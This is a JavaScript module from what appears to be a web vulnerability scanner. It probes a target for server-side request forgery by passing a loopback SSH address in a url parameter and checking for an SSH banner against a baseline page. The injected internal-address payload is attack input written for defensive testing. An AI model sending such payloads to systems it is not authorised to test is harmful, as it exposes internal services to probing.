// Reflected SSRF probe (ported from server/redTeam/ssrf.ts). Asks the target to fetch its own
// loopback SSH port and reports only when an SSH banner comes back and is absent from the
// unparameterised page. Blind SSRF (needs an out-of-band collaborator) is not ported here.

import { buildEvidence } from './evidence.mjs'
import { createScopedFetch, normalizeTarget } from './gate.mjs'
import { signaturePreexists } from './baseline.mjs'

export const name = 'ssrf'
export const owaspCategory = 'A10:2021-Server-Side Request Forgery (SSRF)'

export const SSH_BANNER_SIGNATURE = /SSH-2\.0-\S+|Protocol mismatch\.?/
const INTERNAL_TARGET = 'http://127.0.0.1:22'

export async function run(target, opts = {}, fetchFn = globalThis.fetch) {
  const base = normalizeTarget(target)
  const get = createScopedFetch({ fetchFn, gate: opts.gate, headers: opts.headers, timeoutMs: opts.timeoutMs })

  const attackUrl = `${base}/?url=${INTERNAL_TARGET}`
  const res = await get(attackUrl)
  const match = SSH_BANNER_SIGNATURE.exec(res.body)
  if (!match) return null

  // The control is the page with no url parameter at all, not a benign URL value.
  if (await signaturePreexists(get, `${base}/`, SSH_BANNER_SIGNATURE)) return null

  return {
    module: name,
    owaspCategory,
    testName: 'Active Server-Side Request Forgery (SSRF)',
    payload: INTERNAL_TARGET,
    severity: 'critical',
    description: 'The target returned a loopback SSH banner for an attacker-chosen internal URL, which shows it fetched that address on our behalf.',
    fix: 'Enforce allow-listing for backend fetches and block loopback and private address ranges.',
    evidence: buildEvidence({
      method: 'oracle',
      attackUrl,
      status: res.status,
      contentType: res.contentType,
      body: res.body,
      matchIndex: match.index,
      quote: match[0],
      why: 'An SSH banner from 127.0.0.1 is internal-only data. The unparameterised page does not contain it, so the server must have fetched the injected address.',
      demonstration: `Asked the target to fetch "${INTERNAL_TARGET}"; the response carried "${match[0]}".`,
    }),
  }
}
